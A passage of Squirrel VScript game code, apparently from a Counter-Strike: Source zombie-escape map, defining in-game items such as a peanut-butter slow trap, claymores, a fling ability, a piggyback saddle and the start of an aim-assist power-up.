						EntFireByHandle(button,"Kill","",0.00,null,null);
						::ITEMS.billnye.SpawnBillNye(spos,button.GetAngles());
						return true;
					}
				}},hammerid);
		},
		function SpawnBillNye(pos,rot)
		{
			//::manager.PrecacheModel("models/luffaren/billnye.mdl");
			::Ent(pos,rot,"prop_dynamic",{
					model="models/luffaren/billnye.mdl",
					rendermode = 1,
					modelscale = 1.10,
					targetname = "i_billnye",
				},{
				ticking = true,
				sounds = [],
				function Tick(){
					if(!ticking)return;
					EntFireByHandle(self,"RunScriptCode","Tick();",::ITEMS.billnye.tickrate,null,null);
					for(local h;h=Entities.FindByClassnameWithin(h,"player",self.GetOrigin(),::ITEMS.billnye.scan_range);)
					{
						if(h==null||!h.IsValid()||h.GetTeam()!=2||h.IsAlive()==false)continue;
						h.ValidateScriptScope();
						if("invincible" in h.GetScriptScope())continue;
						if(::ITEMS.billnye.scan_only_front)
						{
							if(::GetDistance(self.GetOrigin()+(self.GetForwardVector()*5),h.GetOrigin()) > ::GetDistance(self.GetOrigin()-(self.GetForwardVector()*5),h.GetOrigin()))
								continue;
						}
						local dir = (self.GetOrigin()+Vector(0,0,78))-h.EyePosition();
						dir.Norm();
						local vel = h.GetVelocity();
						if(vel.z > 0)vel.z = 0;
						h.SetVelocity(Vector(0,0,vel.z));
						h.SetForwardVector(dir);
					}
					
				},
				stopped = false,
				function Stop(){
					if(stopped)return;
					stopped = true;
					ticking = false;		//__CSS__ this wasn't added, so destructo_hammer didn't fully stop the logic
					EntFireByHandle(self,"AddOutput","skin 0",0.00,null,null);
					::Sound("*luffaren/billnye_turnoff.mp3",self.GetOrigin()+Vector(0,0,78),null,::ITEMS.billnye.soundrange,35.00,100,10);
					foreach(s in sounds)
					{
						if(s==null||!s.IsValid())continue;
						EntFireByHandle(s,"StopSound","",0.00,null,null);
						EntFireByHandle(s,"Volume","0",0.00,null,null);
						EntFireByHandle(s,"Kill","",0.10,null,null);
					}
				},function Start(){
					EntFireByHandle(self,"Kill","",::ITEMS.billnye.cleantime+::ITEMS.billnye.playtime+5.00,null,null);
					//EntFireByHandle(self,"fadeandkill","5",::ITEMS.billnye.cleantime+::ITEMS.billnye.playtime+0.05,null,null);
					::FadeAndKill(self,5.00,::ITEMS.billnye.cleantime+::ITEMS.billnye.playtime+0.05);		//__CSS__ fadeandkill doesn't exist in css
					if(stopped)return;
					EntFireByHandle(self,"RunScriptCode","Tick();",::ITEMS.billnye.start_tickdelay,null,null);
					EntFireByHandle(self,"RunScriptCode","ticking=false;",::ITEMS.billnye.playtime-0.02,null,null);
					EntFireByHandle(self,"AddOutput","skin 1",0.00,null,null);
					EntFireByHandle(self,"AddOutput","skin 0",::ITEMS.billnye.playtime-0.02,null,null);
					for(local i=0;i<::ITEMS.billnye.soundstack;i++)
					{
						::Sound("*luffaren/billnye.mp3",self.GetOrigin()+Vector(0,0,78),null,::ITEMS.billnye.soundrange,35.00,100,10,{
							master = self,
							function Run(){
								master.GetScriptScope().sounds.push(soundhandle);
							}});
					}
					::HurtStunBoss(self.GetOrigin()+Vector(0,0,80),::ITEMS.billnye.bosshit[0],::ITEMS.billnye.bosshit[1],::ITEMS.billnye.bosshit[2],::ITEMS.billnye.bosshit[3],null);
				},function Run(){
					EntFireByHandle(self,"RunScriptCode","Start();",::ITEMS.billnye.start_delay,null,null);
					EntFireByHandle(self,"RunScriptCode","Stop();",::ITEMS.billnye.start_delay+::ITEMS.billnye.playtime,null,null);
					EntFireByHandle(self,"AddOutput","body 1",0.00,null,null);
					EntFireByHandle(self,"AddOutput","skin 0",0.00,null,null);
				}});
		}
	},
	peanutbutter = {
			team = 3,
			hammerid = 25,	//example: 1 (range 1-999)
			cooldown = 5.00,
			uses = 10,
			lifetime = 15.00,
			slow_amount = -0.85,
			slow_time = 6.00,
			trigger_size = 50,
			fx_limit = 10,
			bosshit = [300,5000,30.00,3.00],			//radius,damage,stunchance,stuntime_add
		fx_amt = 0,
		function Spawn(pos){
			::CreateItem(pos,Vector(),1,"PeanutButter","("+cooldown.tostring()+"s|"+uses.tostring()+"x)\nSmear out a plane of peanut butter"+
				"\nIt slows zombies heavily for "+slow_time.tostring()+"s on-touch\nThe smear lasts "+lifetime.tostring()+"s\n"+
				"The same smear can't slow the same zombie twice\nThe slowdown stacks\nCan hurt/stun boss on-spawn",{
				model = null,
				uses = (0+uses),
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/peanut_butter_can.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-30)-(button.GetForwardVector()*3.5),Vector(0,RandomInt(0,360),0),"prop_dynamic",{
						//::Ent(button.GetOrigin()+Vector(0,0,-52),Vector(0,RandomInt(0,360),0),"prop_dynamic",{
								model="models/luffaren/peanut_butter_can.mdl",
								modelscale = 0.50,
								rendermode = 1,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						if(!::MOTHER_ZOMBIE_SPAWNED)return false;
						if(::ITEMS.squid.PlayerInked(user))return;
						button.GetScriptScope().cooldown = 0.00+::ITEMS.peanutbutter.cooldown;
						uses--;
						if(uses<=0)EntFireByHandle(button,"Kill","",0.00,null,null);
						::ITEMS.peanutbutter.SpawnPeanutbutter(button.GetOrigin(),Vector(0,RandomInt(0,360),0));
						EntFireByHandle(model,"AddOutput","rendercolor 255 0 0 150",0.00,null,null);
						return true;
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","renderamt 255",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255 255",0.00,null,null);
					}
				}},hammerid);
		},
		function SpawnPeanutbutter(pos,rot)
		{
			//::manager.PrecacheModel("models/luffaren/peanut_butter.mdl");
			::Ent(pos,rot,"prop_physics_override",{
					model="models/luffaren/peanut_butter.mdl",
					spawnflags = 6,
					nodamageforces = 1,
					rendermode = 1,
					rendercolor = "200 180 100",
					targetname = "i_peanutbutter",
					DisableBoneFollowers = true,
				},{
				function Run(){
					EntFireByHandle(self,"Kill","",::ITEMS.peanutbutter.lifetime,null,null);
					::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
							spawnflags = 1,
							filtername = "filter_non_invincible_t",
						},{
						model = self,
						touchers = [],
						function Touch(){
							local toucher = activator;	//__CSS__ activator may get reset, store toucher
							toucher.ValidateScriptScope();
							if("invincible" in toucher.GetScriptScope())return;
							foreach(t in touchers){if(t==toucher)return;}
							touchers.push(toucher);
							EntFire("manager","RunScriptCode",
								" AddSpeed("+::ITEMS.peanutbutter.slow_amount.tostring()+","+::ITEMS.peanutbutter.slow_time.tostring()+"); ",
								0.00,toucher);
							if(::ITEMS.peanutbutter.fx_amt > ::ITEMS.peanutbutter.fx_limit)return;
							::ITEMS.peanutbutter.fx_amt++;
							EntFire("manager","RunScriptCode"," ::ITEMS.peanutbutter.fx_amt--; ",0.20,null);
							::Sound("physics/flesh/flesh_squishy_impact_hard4.wav",toucher.GetOrigin(),null,1000,0.04,RandomInt(130,150),10);
							::Particle("blood_impact_yellow_01",toucher.GetOrigin(),Vector(0,RandomInt(0,360),0),null,0.03);
						},function Run(){
							local mm = (0.00+::ITEMS.peanutbutter.trigger_size).tostring();
							EntFireByHandle(self,"SetParent","!activator",0.00,model,null);
							EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
							EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
							EntFireByHandle(self,"AddOutput","mins -"+mm+" -"+mm+" -3",0.00,null,null);
							EntFireByHandle(self,"AddOutput","maxs "+mm+" "+mm+" 3",0.00,null,null);
							EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
							EntFireByHandle(self,"Enable","",0.02,null,null);
						}});
					::Sound("physics/flesh/flesh_squishy_impact_hard4.wav",self.GetOrigin(),null,10000,0.20,RandomInt(90,105),10);
					::Sound("physics/flesh/flesh_squishy_impact_hard3.wav",self.GetOrigin(),null,10000,0.20,RandomInt(90,105),10);
					::HurtStunBoss(self.GetOrigin(),::ITEMS.peanutbutter.bosshit[0],::ITEMS.peanutbutter.bosshit[1],::ITEMS.peanutbutter.bosshit[2],::ITEMS.peanutbutter.bosshit[3],null);
				}});
		}
	},
	claymore = {
			team = 3,
			hammerid = 20,	//example: 1 (range 1-999)
			uses = 10,
			trigger_radius_front = 100,
			trigger_radius_side = 25,
			explosion_damage = 3000,
			explosion_range = 500,
			explosion_ignite_time = 7.00,
			explosion_ignite_range = 100,
			explosion_velstop_range = 200,
			explosion_ignite_slow_amount = -0.44,
			explosion_ignite_slow_time = 7.00,
			blow_delay = 0.50,
			fx_limit = 10,
			bosshit_scan_radius = 300,
			bosshit_radius = 500,
			bosshit_damage = 2500,
			bosshit_stunchance = 5.00,
			bosshit_stuntime_add = 1.00,
			firecrystal_range = 400,
			firecrystal_dmgmult_add = 1.50,		//damage-multiplier of claymore to += when firecrystal is used
			firecrystal_dmgmult_max = 5.00,		//max-allowed damage-multiplier of claymore to += when firecrystal is used
		fxamt = 0,
		nameindex = 0,
		function Spawn(pos){
			::CreateItem(pos,Vector(),1,"Claymore","("+uses.tostring()+"x)\nPlant claymores in front of you"+
				"\nThey blow up when zombies go in front\nThey hurt, burn and stop zombies\nCan hurt/stun boss\nFireCrystal can stack-buff its damage",{
				uses = (0+::ITEMS.claymore.uses),
				model = null,
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/claymore.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-46),button.GetAngles(),"prop_dynamic",{
								model="models/luffaren/claymore.mdl",
								modelscale = 0.80,
								rendermode = 1,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						if(!::MOTHER_ZOMBIE_SPAWNED)return false;
						if(::ITEMS.squid.PlayerInked(user))return;
						button.GetScriptScope().cooldown = 0.20;
						EntFireByHandle(model,"AddOutput","renderamt 150",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 0 0 150",0.00,null,null);
						local spos = user.GetOrigin()+Vector(0,0,1);
						spos = spos+(user.GetForwardVector()*(15*TraceLinePlayersIncluded(spos,spos+(user.GetForwardVector()*15),user)));
						local downtrace = TraceLinePlayersIncluded(spos,spos-(user.GetUpVector()*40),user);
						if(downtrace ==1.00)return false;
						uses--;
						if(uses<=0)
						{
							button.GetScriptScope().cooldown = null;
							EntFireByHandle(button,"Kill","",0.00,null,null);
						}
						spos = spos-(user.GetUpVector()*(40*downtrace));
						::ITEMS.claymore.SpawnClaymore(spos,model.GetAngles(),user);
						return true;
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","renderamt 255",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255 255",0.00,null,null);
					}
				}},hammerid);
		},
		function SpawnClaymore(pos,rot,owner=null)
		{
			//::manager.PrecacheModel("models/luffaren/claymore.mdl");
			::Ent(pos,rot,"prop_dynamic",{
					model="models/luffaren/claymore.mdl",
					//spawnflags = 14,
					//nodamageforces = 1,
					targetname = "i_claymore",
				},{
				rot = rot,
				blowing = false,
				dmgmult = 1.00,
				owner = owner,
				function TickBossScan(){
					if(blowing)return;
					EntFireByHandle(self,"RunScriptCode"," TickBossScan(); ",0.50,null,null);
					if(Entities.FindByNameNearest("boss_eye_hitbox",self.GetOrigin(),::ITEMS.claymore.bosshit_scan_radius)!=null)
					{
						blowing = true;
						EntFireByHandle(self,"RunScriptCode"," Blow(); ",::ITEMS.claymore.blow_delay,activator,null);
						::Sound("*luffaren/click1.mp3",self.GetOrigin()+Vector(0,0,4),null,10000,0.20,RandomInt(95,105),10);
					}
				},function Blow(){
					EntFireByHandle(self,"Kill","",0.00,null,null);
					for(local h;h=Entities.FindByClassnameWithin(h,"player",self.GetOrigin(),::ITEMS.claymore.explosion_range);)
					{
						if(h==null||!h.IsValid()||h.GetTeam()!=2||h.IsAlive()==false)continue;
						h.ValidateScriptScope();
						if("invincible" in h.GetScriptScope())continue;
						local distm = 0.00+::GetDistance(self.GetOrigin(),h.GetOrigin());
						local gottaburn = false;
						local gottastop = false;
						if(distm <= ::ITEMS.claymore.explosion_ignite_range)gottaburn = true;
						if(distm <= ::ITEMS.claymore.explosion_velstop_range)gottastop = true;
						distm = ((0.00+::ITEMS.claymore.explosion_range)-distm);
						distm /= ::ITEMS.claymore.explosion_range;
						local newhp = h.GetHealth() - (((::ITEMS.claymore.explosion_damage*distm)*dmgmult) * ::HURTPLAYER_mult_t);
						if(newhp<=0)
							::HurtPlayer(h,999999,self.GetOrigin(),RandomInt(200,400),owner,"claymore");
						else
						{
							h.SetHealth(newhp);
							if(gottaburn)
							{
								if(::ITEMS.claymore.explosion_ignite_time > 0.00)
									EntFireByHandle(h,"IgniteLifeTime",::ITEMS.claymore.explosion_ignite_time.tostring(),0.00,null,null);
								if(::ITEMS.claymore.explosion_ignite_slow_amount != 0.00)
									EntFire("manager","RunScriptCode",
									" AddSpeed("+::ITEMS.claymore.explosion_ignite_slow_amount.tostring()+","+::ITEMS.claymore.explosion_ignite_slow_time.tostring()+"); ",
									0.00,h);
							}
							if(gottastop)
							{
								local hvel = h.GetVelocity();
								hvel.x = 0;
								hvel.y = 0;
								if(hvel.z>0)hvel.z = 0;
								h.SetVelocity(hvel);
							}
						}
					}
					if(::finale_started)
					{
						::HurtStunBoss(	self.GetOrigin()+Vector(0,0,100),
							::ITEMS.claymore.bosshit_radius*dmgmult,::ITEMS.claymore.bosshit_damage*dmgmult,
							::ITEMS.claymore.bosshit_stunchance*dmgmult,::ITEMS.claymore.bosshit_stuntime_add*dmgmult,null);
					}
					::ITEMS.claymore.fxamt++;
					EntFire("manager","RunScriptCode"," ::ITEMS.claymore.fxamt--; ",0.20,null);
					if(::ITEMS.claymore.fxamt > ::ITEMS.claymore.fx_limit)return;
					::Sound("*luffaren/explode_1.mp3",self.GetOrigin()+Vector(0,0,4),null,20000,0.20,RandomInt(95,105),10);
					::Sound("*luffaren/explode_4.mp3",self.GetOrigin()+Vector(0,0,4),null,50000,0.20,RandomInt(45,55),10);
					::Particle("water_splash_01_refract",self.GetOrigin()+Vector(0,0,4),Vector(),null,0.10);
					::Ent(self.GetOrigin()+Vector(0,0,8),Vector(),"env_explosion",{
							//fireballsprite = "sprites/zerogxplode.spr", //__CSS__ this shouldnt be needed
							iMagnitude = 0,
							iRadiusOverride = 0,
							rendermode = 5,
							spawnflags = 3,
							rendercolor = "255 255 255",
						},{function Run(){
							EntFireByHandle(self,"Explode","",0.01,null,null);
							EntFireByHandle(self,"Kill","",0.05,null,null);
						}});
				},function Run(){
					::CreateCostCleaner(self,2);
					::CreateTemCleaner(self,{
						model=self,
						function Clean(){
							if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
						}});
					::Sound("physics/metal/metal_barrel_impact_hard7.wav",self.GetOrigin()+Vector(0,0,4),null,5000,0.20,RandomInt(80,100),10);
					if(::finale_started)EntFireByHandle(self,"RunScriptCode"," TickBossScan(); ",0.03,null,null);
					::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
							spawnflags = 1,
							filtername = "filter_t",
						},{
						master = self,
						touched = false,
						function Touch(){
							if(touched)return;
							touched = true;
							local toucher = activator;	//__CSS__ activator may get reset, store toucher
							if(master.GetScriptScope().blowing)return;
							master.GetScriptScope().blowing = true;
							EntFireByHandle(master,"RunScriptCode"," Blow(); ",::ITEMS.claymore.blow_delay,toucher,null);
							::Sound("*luffaren/click1.mp3",self.GetOrigin()+Vector(0,0,4),null,10000,0.20,RandomInt(95,105),10);
						},function Run(){
							EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
							EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
							local smins = "-5 "+(-::ITEMS.claymore.trigger_radius_side).tostring()+" -50";
							local smaxs = ""+::ITEMS.claymore.trigger_radius_front.tostring()+" "+::ITEMS.claymore.trigger_radius_side.tostring()+" 50";
							EntFireByHandle(self,"AddOutput","mins "+smins,0.00,null,null);
							EntFireByHandle(self,"AddOutput","maxs "+smaxs,0.00,null,null);
							EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
							EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
							EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
							EntFireByHandle(self,"Enable","",0.10,null,null);
								//EntFireByHandle(self,"RunScriptCode",
								//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
								//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,10.00); ",0.05,null,null);
						}});
				}});
		}
	},
	fling = {
			team = 2,
			hammerid = 19,	//example: 1 (range 1-999)
			fling_radius = 600,
			fling_force = 1700,		//__CSS__ og 1400 which seems too weak in css
			fling_zmin = 300,
			fling_zmax = 700,
			cooldown = 30.00,
			uses = 1,
		function Spawn(pos){
			//::CreateItem(pos,Vector(),3,"Fling","("+cooldown+"s)\nFlings humans away from you\nPush them off edges\nOr fling away their defenses",{	//OLD v1_5 - is single-use in v1_6+
			::CreateItem(pos,Vector(),3,"Fling","("+uses+"x)\nFlings humans away from you\nPush them off edges\nOr fling away their defenses",{
				model=null,
				uses = (0+uses),
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/props_combine/combinebutton.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-35)+(button.GetRightVector()*2),button.GetAngles()+Vector(90,0,0),"prop_dynamic",{
								model="models/props_combine/combinebutton.mdl",
								modelscale = 0.60,
								rendermode = 1,
								glowenabled = 1,
								glowdist = 2000,
								glowstyle = 1,
								glowcolor = "100 0 50",
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						button.GetScriptScope().cooldown = 0.00+::ITEMS.fling.cooldown;
						uses--;
						if(uses<=0)EntFireByHandle(button,"Kill","",0.00,null,null);
						EntFireByHandle(model,"AddOutput","renderamt 50",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 0 0 50",0.00,null,null);
						EntFireByHandle(model,"AddOutput","glowenabled 0",0.00,null,null);
						::Fling(button.GetOrigin(),::ITEMS.fling.fling_radius,::ITEMS.fling.fling_force,true,null,
							::ITEMS.fling.fling_zmin,::ITEMS.fling.fling_zmax,3,user);
						::Sound("*luffaren/fling_item.mp3",button.GetOrigin(),null,10000,0.50,RandomInt(120,130),10);
						::Sound("*luffaren/fling_item.mp3",button.GetOrigin(),null,10000,0.50,RandomInt(98,102),10);
						::Sound("*luffaren/fling_item.mp3",button.GetOrigin(),null,10000,0.50,RandomInt(98,102),10);
						::Particle("blood_spurt_synth_01",button.GetOrigin(),Vector(),null,0.10);
						::Ent(button.GetOrigin(),Vector(RandomFloat(0,360),RandomFloat(0,360),RandomFloat(0,360)),"prop_dynamic",{
								model="models/luffaren/heal_orb.mdl",
								modelscale = 0.80,
								rendermode = 1,
								renderamt = 255,
								rendercolor = "255 0 0",
							},{function Run(){
								local ii = 0.00;
								local alpha = 255;
								for(local scale = 0.80;scale<3.00;scale += 0.20)
								{
									EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
									EntFireByHandle(self,"AddOutput","modelscale "+scale.tostring(),ii,null,null);
									alpha -= 25;
									if(alpha<0)alpha = 0;
									ii += 0.02;
								}
								EntFireByHandle(self,"Kill","",ii,null,null);
							}});
						return true;
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","renderamt 255",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255 255",0.00,null,null);
						EntFireByHandle(model,"AddOutput","glowenabled 1",0.00,null,null);
					}
				}},hammerid);
		}
	},
	piggyback = {
			team = 3,
			hammerid = 18,	//example: 1 (range 1-999)
			yoshi_enabled = true,		//set to 'true' to enable yoshi-jumping, flying upwards towards the direction of the piggyback-horse
			yoshi_vel_xy = 250,			//how much XY velocity to *ADD* on top of the current piggyback-horse-player-velocity when getting off
			yoshi_vel_z = 550,			//how much Z velocity to *ADD* on top of the current piggyback-horse-player-velocity when getting off
			yoshi_vel_z_min = 550,		//null:ignore, else if the total-accumulated Z-velocity to set^ is *BELOW* this, force-set it to this (global-vel)
		function Spawn(pos){
			if(::round_ended)return;
			::CreateItem(pos,Vector(),2,"Piggyback","(1 seat)\nAllows a human to piggyback on you\n"+
					"(they must press E on the saddle to get on/off)\nIf you die/drop the knife, the player gets forced off\n"+
					"The rider gets a jump/velocity-boost when getting off\n"+
					"(allowing for a yoshi/boost-jump)\n"+
					"Give someone a joyride!",{
				model=null,
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/piggyback.mdl");
						::Ent(button.GetOrigin()-(button.GetForwardVector()*28)+Vector(0,0,0),button.GetAngles(),"prop_physics_override",{
								model="models/luffaren/piggyback.mdl",
								rendermode = 1,
								spawnflags = 266,
								targetname = "piggyback_saddle",
								DisableBoneFollowers = true,
							},{
							button = button,
							logic = this,
							getoff_pos = null,
							rider = null,
							gottaclean = false,
							locked = false,
							function GetOn(player){
								if(locked)return;
								if(player==null||!player.IsValid()||player.GetTeam()!=3||player.IsAlive()==false)return;
								if(rider==null||!rider.IsValid()||rider.GetTeam()!=3||rider.IsAlive()==false){}else return;	//new in v1_7
								if(button.GetMoveParent().GetMoveParent()==player)return;
								for(local h;h=Entities.FindByName(h,"item_piggyback");)
								{
									if(h.GetMoveParent().GetMoveParent()==player)return;
								}
								GetOff();
								rider = player;
								//rider.SetOrigin(self.GetOrigin()+Vector(0,0,-35));
								rider.SetVelocity(Vector());
								rider.AcceptInput("AddOutput","movetype 0",null,null);
								rider.ValidateScriptScope();
								rider.GetScriptScope().__piggyback <- self;
								//rider.AcceptInput("SetParent","!activator 0",self,null);
								//EntFireByHandle(rider,"AddOutput","movetype 0",0.00,null,null);
								//EntFireByHandle(rider,"SetParent","!activator",0.00,self,null);
							},function GetOff(){
								if(rider==null||!rider.IsValid())
								{
									rider = null;
									return;
								}
								try{
									if(::ITEMS.piggyback.yoshi_enabled)
									{
										if(button.GetMoveParent().GetMoveParent()==null||!button.GetMoveParent().GetMoveParent().IsValid())
											rider.SetVelocity(Vector());
										else
										{
											local dir = button.GetMoveParent().GetMoveParent().GetForwardVector();
											local vel = button.GetMoveParent().GetMoveParent().GetVelocity();
											vel += (dir*::ITEMS.piggyback.yoshi_vel_xy);
											vel.z += ::ITEMS.piggyback.yoshi_vel_z;
											if(::ITEMS.piggyback.yoshi_vel_z_min != null && vel.z < ::ITEMS.piggyback.yoshi_vel_z_min)
												vel.z = (0.00+::ITEMS.piggyback.yoshi_vel_z_min);
											rider.SetVelocity(vel);
											rider.SetForwardVector(dir);
										}
									}
									else rider.SetVelocity(Vector());
								}catch(e){printl("::ITEMS.piggyback yoshi error: "+e);rider.SetVelocity(Vector());}
								EntFireByHandle(rider,"ClearParent","",0.00,null,null);
								EntFireByHandle(rider,"AddOutput","movetype 2",0.00,null,null);
								if(getoff_pos==null)	//new in v1_7 - try to fetch a safe getoff-pos
								{
									try{getoff_pos = button.GetMoveParent().GetMoveParent().GetOrigin()+Vector(0,0,1);
									}catch(e){printl("[::ITEMS.piggyback ERROR] - could not get valid getoff_pos");}
								}
								if(getoff_pos==null||rider.GetTeam()!=3)
									EntFireByHandle(rider,"SetHealth","-1",0.00,null,null);
								else
								{
									rider.ValidateScriptScope();
									rider.GetScriptScope().piggyback_gop <- Vector()+getoff_pos;
									EntFireByHandle(rider,"RunScriptCode"," self.SetOrigin(piggyback_gop); ",0.05,null,null);
								}
								try{rider.GetScriptScope().__piggyback = null;}catch(e){}
								rider = null;
							},
							function Think(){
								if(rider==null||!rider.IsValid()||rider.GetTeam()!=3||rider.IsAlive()==false)return 0.5;
								rider.SetVelocity(Vector());
								rider.AcceptInput("AddOutput","movetype 0",null,null);
								rider.SetAbsOrigin(button.GetOrigin()-(button.GetForwardVector()*40)+Vector(0,0,-32))
								return -1;
							},function Tick(){
								if(gottaclean)
								{
									GetOff();
									EntFireByHandle(self,"Kill","",0.10,null,null);
									return;
								}
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.01,null,null);
								if(button==null||!button.IsValid()){gottaclean=true;return;}
								//self.SetOrigin(button.GetOrigin()-(button.GetForwardVector()*28)+Vector(0,0,0));
								self.SetOrigin(button.GetOrigin()-(button.GetForwardVector()*35)+Vector(0,0,0));	//__CSS__ new
								self.SetAngles(button.GetAngles().x,button.GetAngles().y,button.GetAngles().z);
								if(button.GetMoveParent().GetMoveParent()==null)
								{
									GetOff();
									getoff_pos = null;
									return;
								}
								if(button.GetMoveParent().GetMoveParent().IsAlive()==false||button.GetMoveParent().GetMoveParent().GetTeam()!=3)
									{gottaclean=true;return;}
								if(rider==null||!rider.IsValid()||rider.GetTeam()!=3||rider.IsAlive()==false)
								{
									GetOff();
									return;
								}
								if(rider.GetScriptScope().__piggyback != null && rider.GetScriptScope().__piggyback != self)
								{
									GetOff();
									return;
								}
								//if(rider.GetMoveParent()!=self)											//new in v1_6
								//{
								//	GetOff();
								//	return;
								//}
								//if(::GetDistance(rider.GetOrigin(),self.GetOrigin())>100)				//new in v1_6
								//{
								//	//EntFireByHandle(rider,"setlocalorigin","0 0 -35",0.00,null,null);	//__CSS__ <og
								//	rider.SetLocalOrigin(Vector(0,0,60));								//__CSS__ <new
								//	rider.SetAbsOrigin(button.GetOrigin()-(button.GetForwardVector()*40)+Vector(0,0,100));	//__CSS__ <new
								//}
								
								rider.SetVelocity(Vector());
								EntFireByHandle(rider,"AddOutput","movetype 0",0.00,null,null);
								getoff_pos = button.GetMoveParent().GetMoveParent().GetOrigin()+Vector(0,0,1);
							},
							function InputUse(){		//__CSS__ no player_use
								if(gottaclean)return;
								local user = activator;
								if(rider==null||!rider.IsValid())
								{
									if(button.GetMoveParent().GetMoveParent()==null||!button.GetMoveParent().GetMoveParent().IsValid())
										return;
									GetOn(user);
								}
								else if(user == rider)
									GetOff();
							},
							function Run(){
								Inputuse <- InputUse;
								logic.model = self;
								AddThinkToEnt(self,"Think");
								//EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.01,null,null);
								EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(2);",0.00,null,null);
								
								//__CSS__ no player_use
								/*
								::EventListener("player_use",{
									button = button,
									ent = self,
									entindex = self.entindex(),
									gottaclean = false,
									function Tick(){
										if(gottaclean)
										{
											EntFireByHandle(handle,"Kill","",0.00,null,null);
											return;
										}
										EntFireByHandle(handle,"RunScriptCode"," logic.Tick(); ",2.00,null,null);
										if(ent==null||!ent.IsValid())gottaclean = true;
									},function EventFired(name,data){
										if(data.entity == entindex)
										{
											if(ent==null||!ent.IsValid())return;
											ent.ValidateScriptScope();
											if(ent.GetScriptScope().gottaclean)return;
											local pc = ::GetPlayerClass(data.userid);
											if(pc==null)return;
											if(ent.GetScriptScope().rider==null||!ent.GetScriptScope().rider.IsValid())
											{
												if(button.GetMoveParent().GetMoveParent()==null||!button.GetMoveParent().GetMoveParent().IsValid())
													return;
												ent.GetScriptScope().GetOn(pc.handle);
											}
											else if(pc.handle == ent.GetScriptScope().rider)
												ent.GetScriptScope().GetOff();
										}
									},function Run(){
										EntFireByHandle(handle,"RunScriptCode"," logic.Tick(); ",0.10,null,null);
									}});
								*/
								
								
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5){return false;}//use
					//else if(event==6){}//ready
				}},hammerid);
		}
	},
	hackerman = {
			team = 3,
			hammerid = 17,	//example: 1 (range 1-999)
			tickrate = 0.05,		//__CSS__ og was 0.15
			time = 10.00,
			wallhack_range = 5000,
			wallhack_zoffset = 48,
			target_range = 800,
			aimvar = 5,				//__CSS__ og was 20
			aimvar_z_min = 0,		//__CSS__ og was -50
			aimvar_z_max = 50,		//__CSS__ og was 20
			cooldown = 130.00,
			uses = 1,
			bosshit = [1000,20000,30.00,5.00],
		function Spawn(pos){
				//::CreateItem(pos,Vector(),1,"Hackerman","("+cooldown+"s)\nGain "+time.tostring()+"s of aim-hacking + infinite ammo\n"+	//old, 1-time-use in v1_5
			::CreateItem(pos,Vector(),1,"Hackerman","("+uses+"x)\nGain "+time.tostring()+"s of aim-hacking + infinite ammo\n"+
